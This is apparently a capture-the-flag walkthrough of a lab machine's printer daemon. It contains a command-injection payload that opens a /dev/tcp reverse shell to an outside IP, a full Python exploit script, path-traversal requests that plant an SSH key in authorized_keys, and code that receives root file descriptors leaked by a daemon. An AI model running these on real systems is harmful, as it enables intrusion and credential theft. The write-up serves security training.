By inspecting the application code file server.py running on Port 1515, a fatal flaw was found in how it logged printer tasks.

The application took incoming network text data, searched for lines starting with the letter J, and threw everything after it directly into a system command layout using Python’s subprocess.Popen(..., shell=True) function without checking for malicious inputs.

# Vulnerable Backend Pattern:
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)

The Exploit

If a normal job name is Document, the server runs echo 'Archive: Document'.
However, by using a semicolon (;), we can tell the server’s command terminal to finish the echo instruction immediately and run a completely new command of our choice.

We supplied the target queue name archive_intake (discovered on the website interface) and sent a string designed to break out of the sentence structure and call a Reverse Shell back to our machine:

tester' ; bash -c "bash -i >& /dev/tcp/10.10.16.153/4444 0>&1" #

#!/usr/bin/env python3
import socket
import time

# Update with target details
TARGET = "machine_ip"
PORT = 1515

# Update with your listener details
LHOST = "your tuno ip"
LPORT = 4444

# Payload clean-up (removed extra nested quote escapes that break shell compilation)
command = f"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
job_name = f"test' ; {command} #"

# The data block content sent to the daemon
control_file = f"Hlocalhost\nPtester\nJ{job_name}\n".encode()

with socket.create_connection((TARGET, PORT), timeout=5) as sock:
    # Fix 1: Send the mandatory target queue name
    print("[*] Initialising protocol state machine with queue name...")
    sock.sendall(b"\x02archive_intake\n")
    time.sleep(0.3)

    # Calculate precise length of the payload block
    payload_len = len(control_file)
    header = b"\x02" + str(payload_len).encode() + b" cfA001localhost\n"

    print(f"[*] Sending transmission header (Size: {payload_len})...")
    sock.sendall(header)

    # Catch standard acknowledgement from the daemon stage
    ack = sock.recv(1)
    print(f"[+] Header ACK status: {ack!r}")

    # Fix 2: Send the control file content cleanly. The server code handles loop termination.
    print("[*] Uploading malicious print job payload...")
    sock.sendall(control_file)

    # Send a separate single null byte to fulfill the secondary subcommand loop break
    time.sleep(0.2)
    sock.sendall(b"\x00")

    try:
        final_ack = sock.recv(2)
        print(f"[+] Final response captured: {final_ack!r}")
    except socket.timeout:
        print("[!] Connection timed out cleanly (Payload likely executing!)")
        pass

The Result: The server executed our hidden payload and connected back to our netcat listener, granting us our first interactive session on the machine as the lp user

The script was meant to read and write files within a restricted folder structure using two commands: @PJL FSUPLOAD (to read files) and @PJL FSDOWNLOAD (to write files). However, the program didn’t check if paths contained relative directory jump patterns (../)

The Exploit Because os.path.normpath resolves relative paths, sending a request with multiple ../ patterns allowed us to step entirely out of the target folder jail.

  1. Reading the Flag: We read the restricted user file to claim our progression marker:
@PJL FSUPLOAD NAME="0:../user.txt"
  1. Injecting an Access Key: We generated a custom SSH keypair on our attack machine and used the file download capability to forcibly write our public key directly into the archivist’s automated authorization folder:
@PJL FSDOWNLOAD NAME="0:../../../../../../../home/archivist/.ssh/authorized_keys"

The Result: With our public key inside the profile folder, we cleanly logged in via standard SSH to become the archivist user.

Privilege Escalation

Once inside as archivist, we discovered a script running automatically under absolute administrative permissions (root) named /usr/bin/paperwork-daemon. This program monitored a background socket file at /run/paperwork/mgmt.sock.

The daemon was designed to inspect security logs. If it saw suspicious keywords like FSUPLOAD, it triggered a lockdown defense block. Ironically, the lockdown function contained a major design flaw: it opened the highly restricted password file /etc/paperwork/admin_pins.conf as root, and then passed the live file communication link (File Descriptor) straight over the open socket connection to the client using SCM_RIGHTS.

# The flaw passing root file rights down to any connecting client:
evidence_bundle = array.array("i", [log_fd, admin_fd])
conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])

# Allocate buffer space for standard message data and ancillary control messages (fds)
msg_capacity = 1024
anc_capacity = socket.CMSG_SPACE(array.array('i').itemsize * 2)

# Receive message using recvmsg
msg, ancdata, flags, addr = s.recvmsg(msg_capacity, anc_capacity)
print(f"[*] Received Message: {msg.decode(errors='ignore').strip()}")

for cmsg_level, cmsg_type, cmsg_data in ancdata:
    if cmsg_level == socket.SOL_SOCKET and cmsg_type == socket.SCM_RIGHTS:
        # Reconstruct the file descriptors from the raw byte streams
        fds = array.array('i')
        fds.frombytes(cmsg_data[:len(cmsg_data) - (len(cmsg_data) % fds.itemsize)])

The Exploit

  1. We artificially triggered the security alarm by writing the word FSUPLOAD into our logs.
  2. We ran a tiny client script to talk to the socket file.
  3. The daemon panicked, triggered the lockdown code, and inadvertently handed over the live file descriptors ([4, 5]).
  4. Our client script read directly from the leaked descriptor channel, retrieving the contents of the password file without having root permissions.

The Result: The plain-text administrative credential was safely recovered:
